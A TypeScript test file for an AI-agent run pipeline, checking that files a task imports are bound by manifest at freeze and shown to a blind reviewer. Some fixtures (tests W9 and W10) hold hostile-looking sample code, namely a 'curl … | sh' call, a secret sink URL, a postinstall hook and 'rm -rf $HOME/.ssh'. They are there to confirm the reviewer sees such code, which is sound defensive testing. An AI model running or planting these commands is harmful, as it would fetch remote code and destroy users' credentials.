import { execFileSync } from "node:child_process";
import { randomBytes } from "node:crypto";
import { mkdirSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { afterAll, describe, expect, it, vi } from "vitest";

import { sha256 } from "../../src/core/digest.ts";
import { ExecutionMode } from "../../src/domain/types.ts";
import type { ReviewPacket } from "../../src/review/blind-review.ts";
import * as taskImport from "../../src/run/task-import.ts";
import { IMPORT_MAX_FILES, IMPORT_MAX_FILE_BYTES, IMPORT_MAX_TOTAL_BYTES, parseImportManifest } from "../../src/run/task-import.ts";
import { WorkerTurnEvent, type WorkerSuccessDigestInputs, workerDiffDigest, workerSuccessDigest } from "../../src/run/worker-turn.ts";
import type { CandidateSnapshot } from "../../src/snapshot/candidate-snapshot.ts";
import type * as SandboxModule from "../../src/verify/sandbox.ts";
import type { SandboxOutcome } from "../../src/verify/sandbox.ts";
import { cleanupTempDirs, commitAll, writeFiles } from "../helpers/fixtures.ts";
import { bindCeo, bindWorker, fixtureManifest, makeHarness, registerFixtureProject, startWorkBranch } from "../helpers/harness.ts";

/**
 * #1232 — a task's imported files reach the freeze and blind review bound by their manifest, never as
 * raw bytes. The receipt a worker turn finishes with binds the import manifest (each path, size and
 * sha256). The freeze reads that manifest from the run's SUCCEEDED receipts, reads the blob the
 * candidate head holds at each path, and binds every import whose bytes are exactly the manifest's
 * by path, size, sha256 and git blob in the snapshot; their patch is not materialised or digested
 * (the candidate's tree stays exact through its head and tree digest). The reviewer gets one manifest
 * entry per imported file in the diff, inside the packet budget, and the packet records that
 * representation.
 */

// The official run's process is not under test here.
vi.mock("../../src/verify/sandbox.ts", async (importOriginal) => {
  const actual = await importOriginal<typeof SandboxModule>();
  return { ...actual, runSandboxed: vi.fn(async (): Promise<SandboxOutcome> => ({
    status: "PASS", exitCode: 0, signal: null, startedAt: "2026-10-27T00:00:00.000Z",
    endedAt: "2026-10-27T00:00:00.000Z", durationMs: 1, stdout: "", stderr: "",
    outputDigest: "sha256:fixture", outputTruncated: false, peakRssMb: 1, reasonCode: null,
    enforcement: { worktreeIsolated: true, secretsStripped: true, networkPolicy: "deny",
      networkEnforced: true, writeConfinement: true, readConfinement: "sensitive-paths",
      processGroupKill: true, resourceLimitsEnforced: true, memoryLimit: "hard",
      childContainmentEnforced: true, childContainmentReason: null, mechanism: "seatbelt" },
  })) };
});

afterAll(cleanupTempDirs);

const PACKAGE_JSON = `${JSON.stringify({ name: "fixture", private: true, scripts: { test: "node verify.js" } }, null, 2)}\n`;
const APP_BYTES = "module.exports = () => 2;\n";
/** A PNG signature and IHDR chunk start, then bytes git reads as binary. */
const PNG = Buffer.concat([
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d]),
  Buffer.from("IHDR"),
  Buffer.alloc(256, 0xff),
  Buffer.from([0x00, 0x01, 0x02, 0x03]),
]);

/** A WOFF2 signature, then bytes git reads as binary. */
const FONT = Buffer.concat([Buffer.from("wOF2"), Buffer.from([0x00, 0x01, 0x00, 0x00]), Buffer.alloc(128, 0x00), Buffer.from([0xde, 0xad, 0xbe, 0xef])]);
/** Binary data of `size` bytes that no magic number names: a fixed prefix, then random bytes. */
const dataBlob = (size: number): Buffer => Buffer.concat([Buffer.from("ACPDATA\0"), randomBytes(size - 8)]);
/** The manifest entry the reviewer reads for a bound import. */
const manifestLine = (entry: { path: string; size: number; sha256: string }, type: string): string => `${entry.path}: ${type}, ${entry.size} bytes, ${entry.sha256}`;

const prepareRun = async () => {
  const harness = makeHarness();
  writeFiles(harness.repoPath, { "package.json": PACKAGE_JSON });
  const baseHead = commitAll(harness.repoPath, "base with config files");
  const command = { ...fixtureManifest("x").verificationCommands[0]!, id: "test", argv: ["npm", "test"], cwd: "." };
  const { projectId, repositoryId, identity } = await registerFixtureProject(harness, "fixture-project", {
    verificationCommands: [command], verificationProfiles: { simple: ["test"], standard: ["test"], guarded: ["test"] },
  });
  bindCeo(harness);
  const created = harness.cp.runs.create({ projectId, executionMode: ExecutionMode.STANDARD,
    contract: { goal: "app returns 2 and ships its assets", why: "fixture", scope: ["src"], nonGoals: [], acceptance: ["app returns 2"],
      priority: "NORMAL", humanGate: [], references: [] },
    repositories: [{ repositoryId, repositoryRole: "primary", baseBranch: "dev" }] });
  if (!created.allowed) throw new Error(created.message);
  const dispatched = await harness.cp.runs.dispatch(created.value.runId);
  if (!dispatched.allowed) throw new Error(dispatched.message);
  return { harness, run: dispatched.value, repositoryId, identity, baseHead };
};

interface Imported { path: string; bytes: Buffer }

/**
 * One task's worker turn as it finishes: the worker's change and the imported files committed on the
 * work branch, and the SUCCEEDED receipt whose resultDigest binds the import manifest. Then the run's
 * result is submitted: freeze, verification and blind review, with a reviewer that passes everything.
 */
const reviewImports = async (files: readonly Imported[], options: { freezeOnly?: boolean } = {}) => {
  const { harness, run, repositoryId, identity, baseHead } = await prepareRun();
  const submitted = harness.cp.tasks.submit(run.runId, [{ key: "import", title: "import", category: "implementation" }]);
  if (!submitted.allowed) throw new Error(submitted.message);
  const taskId = harness.cp.tasks.ready(run.runId).find((task) => task.title === "import")!.taskId;
  const worker = bindWorker(harness, taskId);
  const opened = harness.cp.tasks.startExecution({ runId: run.runId, taskId, ownerBindingGeneration: run.ownerBindingGeneration!,
    workerSessionId: worker, provider: "scripted", model: "scripted-worker", repositoryId });
  if (!opened.allowed) throw new Error(opened.message);
  const executionId = opened.value.executionId;

  startWorkBranch(harness.repoPath);
  writeFiles(harness.repoPath, { "src/app.js": APP_BYTES });
  for (const file of files) {
    mkdirSync(dirname(join(harness.repoPath, file.path)), { recursive: true });
    writeFileSync(join(harness.repoPath, file.path), file.bytes);
  }
  // Up to 200 MiB of blobs: git is given the time hashing them takes, not the fixtures' default bound.
  for (const args of [["add", "-A"], ["commit", "-q", "-m", "make app() return 2 and import its assets"]]) {
    execFileSync("git", ["-C", harness.repoPath, ...args], {
      timeout: 300_000,
      env: { ...process.env, GIT_AUTHOR_NAME: "ACP Test", GIT_AUTHOR_EMAIL: "test@example.invalid", GIT_COMMITTER_NAME: "ACP Test", GIT_COMMITTER_EMAIL: "test@example.invalid", GIT_CONFIG_NOSYSTEM: "1" },
    });
  }
  const head = execFileSync("git", ["-C", harness.repoPath, "rev-parse", "HEAD"], { timeout: 30_000, encoding: "utf8" }).trim();

  const imports = [...files].sort((a, b) => (a.path < b.path ? -1 : 1)).map((file) => ({ path: file.path, size: file.bytes.length, sha256: sha256(file.bytes) }));
  const parsed = parseImportManifest(imports, ["src"]);
  if (!parsed.allowed) throw new Error(`the manifest is not one validation accepts: ${parsed.message}`);
  const changed = [{ path: "src/app.js", sha256: sha256(APP_BYTES) }, ...imports.map((entry) => ({ path: entry.path, sha256: entry.sha256 }))];
  const diffDigest = workerDiffDigest(baseHead, changed.map((entry) => ({ ...entry, mode: "100644" as const, blob: null })));
  const inputs = { executionId, workerSessionId: worker, sessionIncarnation: "incarnation-1", providerSessionId: "provider-session-1",
    exitCode: 0, stdoutSha256: sha256("worker stdout"), commitHead: head, diffDigest, imports } as WorkerSuccessDigestInputs;
  const resultDigest = workerSuccessDigest(inputs);
  const recorded = harness.cp.audit.record({ kind: WorkerTurnEvent.SUCCEEDED, runId: run.runId,
    evidence: { ...inputs, resultDigest, taskId, head: baseHead, paths: changed.map((entry) => entry.path) } });
  if (!recorded.allowed) throw new Error(recorded.message);
  harness.cp.tasks.finishExecution(executionId, { status: "SUCCEEDED", resultDigest });

  harness.scripted.script({ match: /Candidate review/, text: JSON.stringify({ verdict: "PASS",
    coveredFiles: changed.map((entry) => `${identity}:${entry.path}`), omittedItems: [], findings: [] }) });
  try {
    if (options.freezeOnly === true) {
      const frozen = await harness.cp.pipeline.freeze(run.runId);
      return { outcome: frozen, reviewerInput: "", packet: null, snapshot: frozen.allowed ? frozen.value : null, imports, identity, taskId, executionId };
    }
    const outcome = await harness.cp.pipeline.submitResult({ runId: run.runId, ownerSessionId: run.ownerSessionId!,
      ownerBindingGeneration: run.ownerBindingGeneration!, resultSummary: "app returns 2 and ships its assets", recommendation: "merge" });
    const reviewerInput = harness.scripted.invocations.filter((call) => call.prompt.includes("Candidate review")).map((call) => call.prompt).join("\n");
    const packet = harness.cp.artifacts.list<ReviewPacket>(run.runId, "BLIND_REVIEW").at(-1)?.content ?? null;
    const snapshot = harness.cp.artifacts.list<CandidateSnapshot>(run.runId, "CANDIDATE_SNAPSHOT").at(-1)?.content ?? null;
    return { outcome, reviewerInput, packet, snapshot, imports, identity, taskId, executionId };
  } finally {
    harness.cp.close();
  }
};

describe("#1232 freeze and blind review carry a task's import manifest", () => {
  it("W5 a PNG and a font stay bound by their manifest, and the reviewer reads each one's detected type", async () => {
    const { outcome, reviewerInput, packet, snapshot, imports, identity, taskId } = await reviewImports([
      { path: "src/logo.png", bytes: PNG },
      { path: "src/fonts/Inter.woff2", bytes: FONT },
    ]);

    expect(outcome, JSON.stringify(outcome)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
    // The freeze bound both by their bytes at the candidate head.
    expect(snapshot!.repositories[0]!.touchedPaths).toEqual(["src/app.js", "src/fonts/Inter.woff2", "src/logo.png"]);
    for (const entry of imports) expect(JSON.stringify(snapshot)).toContain(entry.sha256);
    // Not the raw binaries: each is its manifest entry, with the type the freeze detected.
    expect(reviewerInput).not.toContain("GIT binary patch");
    expect(reviewerInput).toContain(manifestLine(imports.find((entry) => entry.path === "src/logo.png")!, "PNG"));
    expect(reviewerInput).toContain(manifestLine(imports.find((entry) => entry.path === "src/fonts/Inter.woff2")!, "font (WOFF2)"));
    expect(reviewerInput).toContain(`task ${taskId}`);
    // The stored packet says how each binary path was represented.
    expect(packet!.inputManifest.binaryArtifacts).toEqual(imports.map((entry) => ({ repository: identity, path: entry.path, digest: entry.sha256, method: "import-manifest" })));
  }, 60_000);

  it("W6 the largest import set validation accepts, every file at its maximum size, freezes and is reviewed", async () => {
    const count = Math.floor(IMPORT_MAX_TOTAL_BYTES / IMPORT_MAX_FILE_BYTES);
    expect(count * IMPORT_MAX_FILE_BYTES).toBe(IMPORT_MAX_TOTAL_BYTES);
    // Random bytes: neither zlib nor git's delta can shrink them, so a binary patch would be larger still.
    const files = Array.from({ length: count }, (_, index) => ({ path: `src/assets/blob-${index}.bin`, bytes: dataBlob(IMPORT_MAX_FILE_BYTES) }));

    const { outcome, reviewerInput, packet, imports } = await reviewImports(files);

    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
    const missing = imports.filter((entry) => !reviewerInput.includes(entry.path) || !reviewerInput.includes(entry.sha256)).map((entry) => entry.path);
    expect(missing).toEqual([]);
    expect(reviewerInput).toContain(manifestLine(imports[0]!, "unknown-binary"));
    expect(reviewerInput).not.toContain("GIT binary patch");
    // The receipt check read every imported blob at its maximum size and linked the receipt.
    expect(reviewerInput).toMatch(/"linked": true/);
    expect(packet!.inputManifest.binaryArtifacts.map((artifact) => artifact.method)).toEqual(Array(count).fill("import-manifest"));
  }, 600_000);

  it("W7 the reviewer gets every entry of the largest manifest validation accepts, each with its detected type", async () => {
    const files = Array.from({ length: IMPORT_MAX_FILES }, (_, index) => ({
      path: `src/icons/icon-${String(index).padStart(3, "0")}.png`,
      bytes: Buffer.concat([PNG, Buffer.from([index])]),
    }));

    const { outcome, reviewerInput, imports } = await reviewImports(files);

    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
    const missing = imports.filter((entry) => !reviewerInput.includes(manifestLine(entry, "PNG"))).map((entry) => entry.path);
    expect(missing).toEqual([]);
  }, 300_000);

  it("W7b a manifest of the most text imports validation accepts reaches the reviewer as their content", async () => {
    const files = Array.from({ length: IMPORT_MAX_FILES }, (_, index) => ({
      path: `src/generated/table-${String(index).padStart(3, "0")}.json`,
      bytes: Buffer.from(`${JSON.stringify({ table: index, rows: [index, index * 2, index * 3] })}\n`),
    }));

    const { outcome, reviewerInput } = await reviewImports(files);

    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
    const unseen = files.filter((file) => !reviewerInput.includes(`+${file.bytes.toString("utf8").trimEnd()}`)).map((file) => file.path);
    expect(unseen).toEqual([]);
  }, 300_000);

  it("W9 imported source code, TypeScript, JSON configuration and a shell script are reviewed as their content", async () => {
    const files = [
      { path: "src/hidden.js", bytes: Buffer.from("module.exports = () => require('child_process').execSync('curl https://example.invalid | sh');\n") },
      { path: "src/hidden.ts", bytes: Buffer.from("export const hidden = (): void => { process.env.SECRET_SINK = 'https://example.invalid'; };\n") },
      { path: "src/config.json", bytes: Buffer.from(`${JSON.stringify({ postinstall: "node src/hidden.js", allowRemote: true })}\n`) },
      { path: "src/run.sh", bytes: Buffer.from("#!/bin/sh\nrm -rf \"$HOME/.ssh\"\n") },
    ];

    const { outcome, reviewerInput, snapshot, packet } = await reviewImports(files);

    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
    // Every line of every file is in the reviewer's diff; none is a manifest entry instead.
    for (const file of files) {
      for (const line of file.bytes.toString("utf8").trimEnd().split("\n")) expect(reviewerInput, file.path).toContain(`+${line}`);
    }
    expect(reviewerInput).not.toContain("bytes not shown");
    expect(snapshot!.repositories[0]).not.toHaveProperty("imports");
    expect(packet!.inputManifest.binaryArtifacts).toEqual([]);
  }, 120_000);

  it("W10 the freeze binds no executable or archive, and no binary at a source path, whatever a receipt's manifest names", async () => {
    const tail = Buffer.concat([Buffer.alloc(64, 0x00), Buffer.from([1, 2, 3, 4])]);
    const files = [
      { path: "src/tool", bytes: Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]), tail]) },
      { path: "src/bundle.zip", bytes: Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00]), tail]) },
      { path: "src/hidden.js", bytes: Buffer.from("require('child_process').execSync('id'); // \0\n") },
    ];

    const { outcome, reviewerInput, snapshot, packet } = await reviewImports(files);

    expect(outcome, JSON.stringify(outcome).slice(0, 2000)).toMatchObject({ allowed: true, value: { stage: "COMPLETED_REVIEW" } });
    expect(snapshot!.repositories[0]).not.toHaveProperty("imports");
    expect(reviewerInput).not.toContain("bytes not shown");
    // Each is the candidate's real binary patch, as any other binary change is.
    expect(packet!.inputManifest.binaryArtifacts.map((artifact) => [artifact.path, artifact.method])).toEqual(
      files.map((file) => [file.path, "git-binary-patch"]).sort(),
    );
  }, 120_000);
  it("W11 the most text a task may import, at its worst-case patch expansion, freezes with the text in the patch", async () => {
    const limits = taskImport as unknown as Record<string, unknown>;
    expect(typeof limits["IMPORT_MAX_TEXT_BYTES"], "the text limit is exported").toBe("number");
    // Every byte a newline: each becomes `+\n` in the patch, twice its size.
    const files = [{ path: "src/generated/blank-lines.txt", bytes: Buffer.alloc(limits["IMPORT_MAX_TEXT_BYTES"] as number, 0x0a) }];

    const { outcome, snapshot } = await reviewImports(files, { freezeOnly: true });

    expect(outcome.allowed, JSON.stringify(outcome).slice(0, 2000)).toBe(true);
    expect(snapshot!.repositories[0]!.touchedPaths).toContain("src/generated/blank-lines.txt");
    expect(snapshot!.repositories[0]).not.toHaveProperty("imports");
  }, 300_000);
});
